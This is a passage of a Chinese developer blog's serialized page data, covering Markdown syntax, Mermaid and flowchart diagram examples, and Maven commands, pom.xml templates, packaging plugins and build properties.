你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线： \n ***\n\n* * *\n\n*****\n\n- - -\n\n----------\n \n 1 2 3 4 5 6 7 8 9 #  删除线 \n 如果段落上的文字要添加删除线，只需要在文字的两端加上两个波浪线 *~~ 即可 \n ~~BAIDU.COM~~\n \n 1 #  下划线 \n 下划线可以通过 HTML 的u标签来实现： \n <u>带下划线文本</u>\n \n 1 #  脚注 \n 脚注是对文本的补充说明。\nMarkdown 脚注的格式如下: \n [^要注明的文本]\n \n 1 #  Markdown 列表 \n Markdown 支持有序列表和无序列表。 \n 无序列表使用星号(*)、加号(+)或是减号(-)作为列表标记，这些标记后面要添加一个空格，然后再填写内容： \n * 第一项\n* 第二项\n* 第三项\n\n+ 第一项\n+ 第二项\n+ 第三项\n\n\n- 第一项\n- 第二项\n- 第三项\n \n 1 2 3 4 5 6 7 8 9 10 11 12 显示效果如下： \n \n 第一项 \n 第二项 \n 第三项 \n \n \n 第一项 \n 第二项 \n 第三项 \n \n \n 第一项 \n 第二项 \n 第三项 \n \n 有序列表使用数字并加上 . 号来表示，如： \n 1. 第一项\n2. 第二项\n3. 第三项\n \n 1 2 3 显示效果如下: \n \n 第一项 \n 第二项 \n 第三项 \n 列表嵌套 \n 列表嵌套只需在子列表中的选项前面添加四个空格即可： \n 1. 第一项：\n    - 第一项嵌套的第一个元素\n    - 第一项嵌套的第二个元素\n2. 第二项：\n    - 第二项嵌套的第一个元素\n    - 第二项嵌套的第二个元素\n \n 1 2 3 4 5 6 显示效果如下: \n \n 第一项：\n \n 第一项嵌套的第一个元素 \n 第一项嵌套的第二个元素 \n \n \n 第二项：\n \n 第二项嵌套的第一个元素 \n 第二项嵌套的第二个元素 \n Markdown 区块 \n Markdown 区块引用是在段落开头使用 > 符号 ，然后后面紧跟一个空格符号： \n > 区块引用\n \n 1 显示效果如下： \n \n 区块引用 \n \n 另外区块是可以嵌套的，一个 > 符号是最外层，两个 > 符号是第一层嵌套，以此类推： \n > 最外层\n> > 第一层嵌套\n> > > 第二层嵌套\n \n 1 2 3 显示效果如下： \n \n 最外层 \n \n 第一层嵌套 \n \n 第二层嵌套 \n \n \n \n 区块中使用列表\n区块中使用列表实例如下： \n > 区块中使用列表\n> 1. 第一项\n> 2. 第二项\n> + 第一项\n> + 第二项\n \n 1 2 3 4 5 显示效果如下： \n \n 区块中使用列表 \n \n 第一项 \n 第二项 \n \n \n 第一项 \n 第二项 \n \n \n 列表中使用区块\n如果要在列表项目内放进区块，那么就需要在 > 前添加四个空格的缩进。\n列表中使用区块实例如下： \n * 第一项\n    > 菜鸟教程\n* 第二项\n \n 1 2 3 显示效果如下： \n \n 第一项\n \n 菜鸟教程 \n \n \n 第二项 \n 超链接 \n 语法： \n [超链接名](超链接地址 "超链接title")\ntitle可加可不加\n \n 1 2 示例： \n [简书](http://jianshu.com)\n[百度](http://baidu.com)\n \n 1 2 注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。 \n <a href="超链接地址" target="_blank">超链接名</a>\n示例\n<a href="https://www.jianshu.com/u/1f5ac0cf6a8b" target="_blank">简书</a>\n \n 1 2 3 #  表格 \n |表头|表头|表头|\n|:---|:--:|---:|\n|内容|内容|内容|\n|内容|内容|内容|\n\n第二行分割表头和内容。\n- 有一个就行，为了对齐，多加了几个\n文字默认居左\n-两边加：表示文字居中\n-右边加：表示文字居右\n \n 1 2 3 4 5 6 7 8 9 10 实例如下： \n \n \n \n 左对齐 \n 右对齐 \n 居中对齐 \n \n \n \n \n 单元格 \n 单元格 \n 单元格 \n \n \n 单元格 \n 单元格 \n 单元格 \n \n \n \n 表格内手动换行 使用HTML  <br>  标签，在本行末尾输入 <br> \n Markdown 代码 \n 单行代码：代码之间分别用一个反引号包起来 \n `printf()` 函数\n \n 1 显示效果如下：\n printf()  函数 \n 代码区块 \n 用 ``` 包裹一段代码，并指定一种语言（也可以不指定）： \n 实例如下： \n $ ( document ) . ready ( function   ( )   { \n     alert ( \'RUNOOB\' ) ; \n } ) ; \n \n 1 2 3 '},{title:"VS Code实现markdown画流程图",frontmatter:{title:"VS Code实现markdown画流程图",date:"2021-04-29T20:28:42.000Z",tags:["markdown"],categories:"markdown",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/markdown/markdown-liu-cheng-tu.html",relativePath:"blogs/markdown/markdown-liu-cheng-tu.md",key:"v-26217af5",path:"/blogs/markdown/markdown-liu-cheng-tu.html",headers:[{level:2,title:"1、横向流程图源码格式：",slug:"_1、横向流程图源码格式"},{level:2,title:"2、竖向流程图源码格式：",slug:"_2、竖向流程图源码格式"},{level:2,title:"3、标准流程图源码格式：",slug:"_3、标准流程图源码格式"},{level:2,title:"4、标准流程图源码格式（横向）：",slug:"_4、标准流程图源码格式-横向"},{level:2,title:"5、UML 时序图源码样例：",slug:"_5、uml-时序图源码样例"},{level:2,title:"6、UML 时序图源码复杂样例：",slug:"_6、uml-时序图源码复杂样例"},{level:2,title:"7、UML 标准时序图样例：",slug:"_7、uml-标准时序图样例"},{level:2,title:"8、甘特图样例：",slug:"_8、甘特图样例"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 1、横向流程图源码格式： \n graph LR\nA[方形] --\x3eB(圆角)\n    B --\x3e C{条件a}\n    C --\x3e|a=1| D[结果1]\n    C --\x3e|a=2| E[结果2]\n    F[横向流程图]\n \n 1 2 3 4 5 6 #  2、竖向流程图源码格式： \n graph TD\nA[方形] --\x3e B(圆角)\n    B --\x3e C{条件a}\n    C --\x3e |a=1| D[结果1]\n    C --\x3e |a=2| E[结果2]\n    F[竖向流程图]\n \n 1 2 3 4 5 6 #  3、标准流程图源码格式： \n st => start :  开始框\nop => operation :  处理框\ncond => condition :   判断框 ( 是或否 ? ) \nsub1 => subroutine :  子流程\nio => inputoutput :  输入输出框\ne => end :  结束框\nst - > op - > cond\n cond ( yes ) - > io - > e\n cond ( no ) - > sub1 ( right ) - > op\n \n 1 2 3 4 5 6 7 8 9 #  4、标准流程图源码格式（横向）： \n st => start :  开始框\nop => operation :  处理框\ncond => condition :   判断框 ( 是或否 ? ) \nsub1 => subroutine :  子流程\nio => inputoutput :  输入输出框\ne => end :  结束框\n st ( right ) - > op ( right ) - > cond\n cond ( yes ) - > io ( bottom ) - > e\n cond ( no ) - > sub1 ( right ) - > op\n \n 1 2 3 4 5 6 7 8 9 #  5、UML 时序图源码样例： \n 对象A->对象B: 对象B你好吗?（请求）\nNote right of 对象B: 对象B的描述\nNote left of 对象A: 对象A的描述(提示)\n对象B--\x3e对象A: 我很好(响应)\n对象A->对象B: 你真的好吗？\n \n 1 2 3 4 5 #  6、UML 时序图源码复杂样例： \n Title: 标题：复杂使用\n对象A->对象B: 对象B你好吗?（请求）\nNote right of 对象B: 对象B的描述\nNote left of 对象A: 对象A的描述(提示)\n对象B--\x3e对象A: 我很好(响应)\n对象B->小三: 你好吗\n小三--\x3e>对象A: 对象B找我了\n对象A->对象B: 你真的好吗？\nNote over 小三,对象B: 我们是朋友\nparticipant C\nNote right of C: 没人陪我玩\n \n 1 2 3 4 5 6 7 8 9 10 11 #  7、UML 标准时序图样例： \n %% 时序图例子,-> 直线，--\x3e虚线，->>实线箭头\n  sequenceDiagram\n    participant 张三\n    participant 李四\n    张三->王五: 王五你好吗？\n    loop 健康检查\n        王五->王五: 与疾病战斗\n    end\n    Note right of 王五: 合理 食物 <br/>看医生...\n    李四--\x3e>张三: 很好!\n    王五->李四: 你怎么样?\n    李四--\x3e王五: 很好!\n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  8、甘特图样例： \n         gantt\n        dateFormat  YYYY-MM-DD\n        title 软件开发甘特图\n        section 设计\n        需求                      :done,    des1, 2014-01-06,2014-01-08\n        原型                      :active,  des2, 2014-01-09, 3d\n        UI设计                     :         des3, after des2, 5d\n    未来任务                     :         des4, after des3, 5d\n        section 开发\n        学习准备理解需求                      :crit, done, 2014-01-06,24h\n        设计框架                             :crit, done, after des2, 2d\n        开发                                 :crit, active, 3d\n        未来任务                              :crit, 5d\n        耍                                   :2d\n        section 测试\n        功能测试                              :active, a1, after des3, 3d\n        压力测试                               :after a1  , 20h\n        测试报告                               : 48h\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 "},{title:"Maven 常用命令",frontmatter:{title:"Maven 常用命令",date:"2021-04-26T20:43:56.000Z",tags:["Maven"],categories:"back-end-maven",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/maven-chang-yong-ming-ling.html",relativePath:"blogs/maven/maven-chang-yong-ming-ling.md",key:"v-2e5167ae",path:"/blogs/maven/maven-chang-yong-ming-ling.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 1、mvn compile 编译,将Java 源程序编译成 class 字节码文件。\n2、mvn test 测试，并生成测试报告\n3、mvn clean 将以前编译得到的旧的 class 字节码文件删除\n4、mvn pakage 打包,动态 web工程打 war包，Java工程打 jar 包。\n5、mvn install 将项目生成 jar 包放在仓库中，以便别的模块调用 \n"},{title:"maven 仓库设置",frontmatter:{title:"maven 仓库设置",date:"2021-07-15T23:02:42.000Z",tags:["maven"],categories:"setting",published:!0,hideInList:!1,feature:"/post-images/YlEn060fy.jpg",isTop:!1},regularPath:"/blogs/maven/maven_YlEn060fy.html",relativePath:"blogs/maven/maven_YlEn060fy.md",key:"v-87e1ce96",path:"/blogs/maven/maven_YlEn060fy.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 安装配置Maven的本地仓库 \n"},{title:"查看依赖、按照软件",frontmatter:{title:"查看依赖、按照软件",date:"2021-12-06 22:41:38",tags:["maven","gradle"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/maven_list_dependence.html",relativePath:"blogs/maven/maven_list_dependence.md",key:"v-70a090d6",path:"/blogs/maven/maven_list_dependence.html",headers:[{level:2,title:"gradle",slug:"gradle"},{level:2,title:"maven",slug:"maven"},{level:2,title:"node",slug:"node"},{level:2,title:"python",slug:"python"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" gradle \n gradle Dependencies --configuration compileClasspath\n \n 1 #  maven \n mvn dependency:tree\n \n 1 #  node \n npm  list -g --depth = 0 \n \n 1 #  python \n pip list\n \n 1 "},{title:"maven与gradle的相互转换",frontmatter:{title:"maven与gradle的相互转换",date:"2021-07-13T23:55:41.000Z",tags:["Maven","Gradle"],categories:"back-end-maven",published:!0,hideInList:!1,feature:"/post-images/tGpXzOwd3.png",isTop:!1},regularPath:"/blogs/maven/maven_gradle_switch.html",relativePath:"blogs/maven/maven_gradle_switch.md",key:"v-63fda015",path:"/blogs/maven/maven_gradle_switch.html",headers:[{level:2,title:"gradlew 版本7.0以下，以6.8.1 举例",slug:"gradlew-版本7-0以下-以6-8-1-举例"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" gradle --\x3e maven \n gradlew 版本7.0以下，以6.8.1 举例 \n 在build.gradle 最外层增加以下内容 \n apply plugin: 'java'\napply plugin: 'maven'\n \n 1 2 然后执行 ./gradlew install\n成功后将在build\\poms目录下生成pom-default.xml文件，把它复制到根目录下，改名成pom.xml即可 \n maven --\x3e gradle \n 先保证本机安装了gradle 2.0以上的版本\n然后在maven项目的根目录下运行 \n gradle init --type pom\n \n 1 "},{title:"maven报错：不再支持源选项 5。请使用 6 或更高版本。",frontmatter:{title:"maven报错：不再支持源选项 5。请使用 6 或更高版本。",date:"2021-10-03 11:41:51",tags:["maven"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/maven_not%20support%20version5.html",relativePath:"blogs/maven/maven_not support version5.md",key:"v-3ae6294e",path:"/blogs/maven/maven_not%20support%20version5.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 问题描述 \n 在构建某个maven项目的时候发生了异常，遇到以下错误，理论上是由于没有指定JAVA版本导致的。 \n \n [ERROR] 不再支持源选项 5。请使用 6 或更高版本。 \n [ERROR] 不再支持目标选项 1.5。请使用 1.6 或更高版本。 \n解决方案\npom.xml文件中增加maven编译的java.version jdk版本设置，以及maven.compiler.source 资源编译jdk版本设置和maven.compiler.target 资源构建jdk版本设置 \n     <properties>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n        <maven.compiler.encoding>UTF-8</maven.compiler.encoding>\n        <java.version>1.8</java.version>\n        <maven.compiler.source>1.8</maven.compiler.source>\n        <maven.compiler.target>1.8</maven.compiler.target>\n    </properties> \n \n 1 2 3 4 5 6 7 "},{title:"Maven项目pom文件模版",frontmatter:{title:"Maven项目pom文件模版 ",date:"2021-11-27 17:04:43",tags:["maven","springoot","java"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/maven_pom.html",relativePath:"blogs/maven/maven_pom.md",key:"v-76f4dad5",path:"/blogs/maven/maven_pom.html",headers:[{level:2,title:"初始模板",slug:"初始模板"},{level:2,title:"打包和运行方式",slug:"打包和运行方式"},{level:3,title:"maven-assembly-plugin插件",slug:"maven-assembly-plugin插件"},{level:3,title:"maven-jar-plugin插件",slug:"maven-jar-plugin插件"},{level:3,title:"maven-shade-plugin插件",slug:"maven-shade-plugin插件"},{level:3,title:"打包Scala文件",slug:"打包scala文件"},{level:3,title:"spring-boot-maven-plugin 插件",slug:"spring-boot-maven-plugin-插件"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 创建maven项目pom文件模版以及各种打包方式 \n 初始模板 \n <?xml version="1.0" encoding="UTF-8"?> \n\n < project   xmlns = " http://maven.apache.org/POM/4.0.0 "   xmlns: xsi = " http://www.w3.org/2001/XMLSchema-instance " \n   xsi: schemaLocation = " http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd " > \n   < modelVersion > 4.0.0 </ modelVersion > \n\n   < groupId > com.example </ groupId > \n   < artifactId > App </ artifactId > \n   < version > 0.0.1-SNAPSHOT </ version > \n   < name > demo </ name > \n   < packaging > jar </ packaging > \n\n   \x3c!-- springboot 项目 --\x3e \n   \x3c!-- <parent>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-parent</artifactId>\n    <version>2.5.5</version>\n    <relativePath/>\n  </parent> --\x3e \n\n   < properties > \n     < java.version > 1.8 </ java.version > \n     < maven.compiler.source > 1.8 </ maven.compiler.source > \n     < maven.compiler.target > 1.8 </ maven.compiler.target > \n     < maven.compiler.encoding > UTF-8 </ maven.compiler.encoding > \n     < project.build.sourceEncoding > UTF-8 </ project.build.sourceEncoding > \n   </ properties > \n   < dependencies > \n     \x3c!-- 各种依赖 --\x3e \n   </ dependencies > \n   < build > \n     \x3c!-- 打包插件 --\x3e \n   </ build > \n </ project > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #  打包和运行方式 \n Apache Maven \n \n 使用 maven-assembly-plugin 插件；打的jar包是完整的，可以单独执行。打包速度较慢。 不适合springboot项目。 \n 使用 maven-jar-plugin 和 maven-dependency-plugin 插件，打的jar不包含依赖,不能单独执行。可以打包springboot项目 \n 使用 maven-shade-plugin 插件，可以打包springboot项目。 \n 使用 spring-boot-maven-plugin 插件。 \n maven-assembly-plugin插件 \n \n ssembly 插件支持将项目的所有依赖、文件都打包到同一个输出文件中。目前支持输出以下文件类型： \n \n \n zip \n tar \n tar.gz (or tgz) \n tar.bz2 (or tbz2) \n tar.snappy \n tar.xz (or txz) \n jar \n dir \n war \n \n \n 在 POM.xml 中引入插件，指定打包格式的配置文件 assembly.xml(名称可自定义，可不指定，使用默认)，并指定作业的主入口类： \n \n    < build > \n       < plugins > \n         < plugin > \n           < artifactId > maven-assembly-plugin </ artifactId > \n           < configuration > \n             < archive > \n               \x3c!-- 可选，有多个main方法可以不指定 --\x3e \n               < manifest > \n                   < mainClass > ${groupId}.${artifactId} </ mainClass > \n               </ manifest > \n             </ archive > \n             < descriptorRefs > \n               < descriptorRef > jar-with-dependencies </ descriptorRef > \n\n               \x3c!-- 可以使用默认设置--\x3e \n               \x3c!-- <descriptor>src/main/resources/assembly.xml</descriptor> --\x3e \n             </ descriptorRefs > \n           </ configuration > \n         </ plugin > \n       </ plugins > \n     </ build > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \n assembly.xml 文件内容如下： \n \n < assembly   xmlns = " http://maven.apache.org/ASSEMBLY/2.0.0 " \n           xmlns: xsi = " http://www.w3.org/2001/XMLSchema-instance " \n           xsi: schemaLocation = " http://maven.apache.org/ASSEMBLY/2.0.0\n                              http://maven.apache.org/xsd/assembly-2.0.0.xsd " > \n\n     < id > jar-with-dependencies </ id > \n\n     \x3c!--指明打包方式--\x3e \n     < formats > \n         < format > jar </ format > \n     </ formats > \n\n     < includeBaseDirectory > false </ includeBaseDirectory > \n     < dependencySets > \n         < dependencySet > \n             < outputDirectory > / </ outputDirectory > \n             < useProjectArtifact > true </ useProjectArtifact > \n             < unpack > true </ unpack > \n             < scope > runtime </ scope > \n             \x3c!--这里以排除 storm 环境中已经提供的 storm-core 为例，演示排除 Jar 包--\x3e \n             < excludes > \n                 < exclude > org.apache.storm:storm-core </ exclude > \n             </ excludes > \n         </ dependencySet > \n     </ dependencySets > \n </ assembly > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \n 打包命令 \n \n mvn assembly:assembly\n \n 1 打包后会同时生成两个 JAR 包，其中后缀为 jar-with-dependencies 是含有第三方依赖的 JAR 包，后缀是由 assembly.xml 中   标签指定的，可以自定义修改。 \n \n 运行命令 \n \n \n 单个main方法并且设置了mainClass \n \n java -jar jarfile\n \n 1 \n 单个main方法没有设置mainClass或者多个main方法 \n \n java -cp jarfile com.example.App\n \n 1 #  maven-jar-plugin插件 \n 打的jar包不是可执行jar包，和依赖没有合并，是分离的。 \n 如果你想把某些没有被 Maven 管理 JAR 包打入到最终的 JAR 中，比如你在 resources/lib 下引入的其他非 Maven 仓库中的 JAR，此时可以使用 maven-jar-plugin 和 maven-dependency-plugin 插件将其打入最终的 JAR 中。 \n \n pom 设置 \n \n    < build > \n       < plugins > \n         < plugin > \n             < groupId > org.apache.maven.plugins </ groupId > \n             < artifactId > maven-jar-plugin </ artifactId > \n             < configuration > \n                 < archive > \n                     < manifest > \n                         \x3c!-- 是否绑定依赖，将外部jar包依赖加入到classPath中 --\x3e \n                         < addClasspath > true </ addClasspath > \n                           \x3c!--指定依赖目录--\x3e \n                         < classpathPrefix > lib/ </ classpathPrefix > \n                         \x3c!-- 可选，有多个main方法可以不指定 --\x3e \n                         < mainClass > ${groupId}.${artifactId} </ mainClass > \n                     </ manifest > \n                 </ archive > \n             </ configuration > \n         </ plugin > \n         < plugin > \n             < groupId > org.apache.maven.plugins </ groupId > \n             < artifactId > maven-dependency-plugin </ artifactId > \n               < executions > \n                 < execution > \n                     < id > copy-dependencies </ id > \n                     < phase > package </ phase > \n                     < goals > \n                         \x3c!--将 resources/lib 目录所有 Jar 包打进最终的依赖中--\x3e \n                         < goal > copy-dependencies </ goal > \n                     </ goals > \n                     < configuration > \n                         \x3c!--将 resources/lib 目录所有 Jar 包一并拷贝到输出目录的 lib 目录下--\x3e \n                         < outputDirectory > \n                            ${project.build.directory}/lib\n                         </ outputDirectory > \n                     </ configuration > \n                 </ execution > \n             </ executions > \n         </ plugin > \n       </ plugins > \n     </ build > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \n 打包命令 \n \n mvn package\n \n 1 \n 运行命令 \n \n \n 单个main方法并且设置了mainClass \n \n java -jar jarfile\n \n 1 \n 单个main方法没有设置mainClass或者多个main方法 \n \n java -cp jarfile com.example.App\n \n 1 #  maven-shade-plugin插件 \n maven-shade-plugin  比  maven-assembly-plugin  功能更为强大，比如你的工程依赖很多的 JAR 包，而被依赖的 JAR 又会依赖其他的 JAR 包，这样,当工程中依赖到不同的版本的 JAR 时，并且 JAR 中具有相同名称的资源文件时，shade 插件会尝试将所有资源文件打包在一起时，而不是和 assembly 一样执行覆盖操作 \n 通常使用 maven-shade-plugin 就能够完成大多数的打包需求，其配置简单且适用性最广，因此建议优先使用此方式。 \n \n pom 设置 \n \n    < build > \n     < plugins > \n       < plugin > \n           < groupId > org.apache.maven.plugins </ groupId > \n             < artifactId > maven-shade-plugin </ artifactId > \n             < configuration > \n                 < createDependencyReducedPom > true </ createDependencyReducedPom > \n                 < filters > \n                     < filter > \n                         < artifact > *:* </ artifact > \n                         < excludes > \n                             < exclude > META-INF/*.SF </ exclude > \n                             < exclude > META-INF/*.sf </ exclude > \n                             < exclude > META-INF/*.DSA </ exclude > \n                             < exclude > META-INF/*.dsa </ exclude > \n                             < exclude > META-INF/*.RSA </ exclude > \n                             < exclude > META-INF/*.rsa </ exclude > \n                             < exclude > META-INF/*.EC </ exclude > \n                             < exclude > META-INF/*.ec </ exclude > \n                             < exclude > META-INF/MSFTSIG.SF </ exclude > \n                             < exclude > META-INF/MSFTSIG.RSA </ exclude > \n                         </ excludes > \n                     </ filter > \n                 </ filters > \n                 < artifactSet > \n                     < excludes > \n                         < exclude > org.apache.storm:storm-core </ exclude > \n                     </ excludes > \n                 </ artifactSet > \n             </ configuration > \n             < executions > \n               < execution > \n                 < phase > package </ phase > \n                 < goals > \n                     < goal > shade </ goal > \n                 </ goals > \n                 < configuration > \n                     \x3c!-- 打包 Spring boot 项目的时候，去掉这里的配置 --\x3e \n                     < transformers > \n                         < transformer \n                           implementation = " org.apache.maven.plugins.shade.resource.ServicesResourceTransformer " /> \n                         < transformer \n                           implementation = " org.apache.maven.plugins.shade.resource.ManifestResourceTransformer " > \n                           \x3c!-- 可选，有多个main方法可以不指定 --\x3e \n                           < mainClass > ${groupId}.${artifactId} </ mainClass > \n                         </ transformer > \n                     </ transformers > \n                 </ configuration > \n             </ execution > \n           </ executions > \n       </ plugin > \n     </ plugins > \n   </ build > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 在上面的配置中，排除了部分文件，这是因为有些 JAR 包生成时，会使用 jarsigner 生成文件签名 (完成性校验)，分为两个文件存放在 META-INF 目录下： \n \n a signature file, with a .SF extension； \n a signature block file, with a .DSA, .RSA, or .EC extension。 \n \n 如果某些包的存在重复引用，这可能会导致在打包时候出现 Invalid signature file digest for Manifest main attributes 异常，所以在配置中排除这些文件。 \n \n 打包命令 \n \n mvn package\n \n 1 \n 运行命令 \n \n \n 单个main方法并且设置了mainClass \n \n java -jar jarfile\n \n 1 \n 单个main方法没有设置mainClass或者多个main方法 \n \n java -cp jarfile com.example.App\n \n 1 #  打包Scala文件 \n 如果你使用到 Scala 语言进行编程，此时需要特别注意 ：默认情况下 Maven 是不会把 scala 文件打入最终的 JAR 中，需要额外添加 maven-scala-plugin 插件，常用配置如下： \n    < build > \n       < plugins > \n         < plugin > \n             < groupId > org.scala-tools </ groupId > \n             < artifactId > maven-scala-plugin </ artifactId > \n             < version > 2.15.1 </ version > \n             < executions > \n                 < execution > \n                     < id > scala-compile </ id > \n                     < goals > \n                         < goal > compile </ goal > \n                     </ goals > \n                     < configuration > \n                         < includes > \n                             < include > **/*.scala </ include > \n                         </ includes > \n                     </ configuration > \n                 </ execution > \n                 < execution > \n                     < id > scala-test-compile </ id > \n                     < goals > \n                         < goal > testCompile </ goal > \n                     </ goals > \n                 </ execution > \n             </ executions > \n         </ plugin > \n     </ plugins > \n   </ build > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #  spring-boot-maven-plugin 插件 \n \n pom 设置 \n \n    < build > \n     < plugins > \n       < plugin > \n         < groupId > org.springframework.boot </ groupId > \n         < artifactId > spring-boot-maven-plugin </ artifactId > \n       </ plugin > \n     </ plugins > \n   </ build > \n \n 1 2 3 4 5 6 7 8 \n 打包命令 \n \n mvn package\n \n 1 \n 运行命令 \n \n java -jar jarfile\n \n 1 '},{title:"maven 常用插件及属性",frontmatter:{title:"maven 常用插件及属性",date:"2021-12-06 22:33:32",tags:["maven","springoot","java"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/maven_pom_attribute.html",relativePath:"blogs/maven/maven_pom_attribute.md",key:"v-1fc23475",path:"/blogs/maven/maven_pom_attribute.html",headers:[{level:2,title:"常用 build 插件介绍",slug:"常用-build-插件介绍"},{level:2,title:"六大属性",slug:"六大属性"},{level:3,title:"内置属性(Maven预定义,用户可以直接使用)",slug:"内置属性-maven预定义-用户可以直接使用"},{level:3,title:"POM属性(使用pom属性可以引用到pom.xml文件对应元素的值)",slug:"pom属性-使用pom属性可以引用到pom-xml文件对应元素的值"},{level:3,title:"自定义属性",slug:"自定义属性"},{level:3,title:"settings.xml文件属性",slug:"settings-xml文件属性"},{level:3,title:"Java系统属性",slug:"java系统属性"},{level:3,title:"环境变量属性",slug:"环境变量属性"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 常用 build 插件介绍 \n \n maven-resources-plugin\n该插件的作用是用于复制指定的文件,可以用于jar包和配置文件分离。也可以把前后台项目打包到一起。 \n \n      < build > \n         < plugins > \n             < plugin > \n                 < artifactId > maven-resources-plugin </ artifactId > \n                 < executions > \n                     < execution > \n                         < id > copy-resources </ id > \n                         < phase > package </ phase > \n                         < goals > \n                             < goal > copy-resources </ goal > \n                         </ goals > \n                         < configuration > \n                             < resources > \n                                 < resource > \n                                     < directory > conf/ </ directory > \n                                     < filtering > true </ filtering > \n                                     \x3c!-- include any other file types you want to filter --\x3e \n                                     < includes > \n                                         < include > **/*.* </ include > \n                                     </ includes > \n                                     \x3c!-- exclude any other file types you want to filter --\x3e \n                                     \x3c!-- <excludes>\n                                        <exclude>**/*.map</exclude>\n                                    </excludes> --\x3e \n                                 </ resource > \n                             </ resources > \n                             < outputDirectory > ${project.build.directory}/conf </ outputDirectory > \n                         </ configuration > \n                     </ execution > \n                 </ executions > \n             </ plugin > \n         </ plugins > \n     </ build > \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #  六大属性 \n 内置属性(Maven预定义,用户可以直接使用) \n \n ${project.basedir} \n \n 当前项目所在的目录，即包含pom.xml文件的目录 \n \n ${basedir} \n \n 同project.basedir \n \n ${version} \n \n 表示项目版本 \n \n ${project.baseUri} \n \n 当前项目所在的目录，表示为 URI。自 Maven 2.1.0 起 \n \n ${maven.build.timestamp} \n \n 表示生成开始时间 （UTC） 的时间戳。自 Maven 2.1.0-M1 起 \n \n ${maven.build.timestamp.format} \n \n 表示属性${maven.build.timestamp}的展示格式,默认值为yyyyMMdd-HHmm,可自定义其格式,其类型可参考java.text.SimpleDateFormat。用法如下： \n < properties > \n   < maven.build.timestamp.format > yyyy-MM-dd HH:mm:ss </ maven.build.timestamp.format > \n </ properties > \n \n 1 2 3 #  POM属性(使用pom属性可以引用到pom.xml文件对应元素的值) \n \n ${project.build.directory} \n \n ${project.basedir}/target \n \n ${project.build.sourceEncoding} \n \n 表示主源码的编码格式 \n \n ${project.build.sourceDirectory} \n \n 表示主源码路径 \n \n ${project.build.finalName} \n \n 表示输出文件名称 \n \n ${project.version} \n \n 表示项目版本,与${version}相同 \n 自定义属性 \n <properties>...</properties>  可以定义自定义属性\n例如 \n < frontend-src-dir > ${project.basedir}/src/main/web </ frontend-src-dir > \n \n 1 就定义了frontend-src-dir属性，在其他地方使用${frontend-src-dir}使用该属性值。 \n settings.xml文件属性 \n 与pom属性同理,用户使用以settings.开头的属性引用settings.xml文件中的XML元素值\n${settings.localRepository}表示本地仓库的地址 \n Java系统属性 \n 所有的Java系统属性都可以使用Maven属性引用\n使用mvn help:system命令可查看所有的Java系统属性;\nSystem.getProperties()可得到所有的Java属性;\n${user.home}表示用户目录; \n 环境变量属性 \n 所有的环境变量都可以用以env.开头的Maven属性引用\n使用mvn help:system命令可查看所有环境变量;\n${env.JAVA_HOME}表示JAVA_HOME环境变量的值; \n"},{title:"Maven Dependency Scope",frontmatter:{title:"Maven Dependency Scope",date:"2021-12-05 16:04:47",tags:["maven"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/maven/maven_scope.html",relativePath:"blogs/maven/maven_scope.md",key:"v-0979bd15",path:"/blogs/maven/maven_scope.html",headers:[{level:2,title:"导语：",slug:"导语"},{level:2,title:"常用scope 介绍",slug:"常用scope-介绍"},{level:3,title:"compile",slug:"compile"},{level:3,title:"rovided",slug:"rovided"},{level:3,title:"runtime",slug:"runtime"},{level:3,title:"test",slug:"test"},{level:3,title:"system",slug:"system"},{level:3,title:"import (Maven 2.0.9 之后新增)",slug:"import-maven-2-0-9-之后新增"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 导语： \n Dependency scope 是用来限制Dependency的作用范围的, 影响maven项目在各个生命周期时导入的package的状态。自从2.0.x后，新增了1种，现在有了6种scope \n 常用scope 介绍 \n compile \n 默认的scope,表示 dependency 可以在生命周期中使用。而且这些dependencies 会传递到依赖的项目中。 \n rovided \n 跟compile相似，但是表明了dependency 由JDK或者容器提供。\n例如Servlet AP和一些Java EE APIs。这个scope 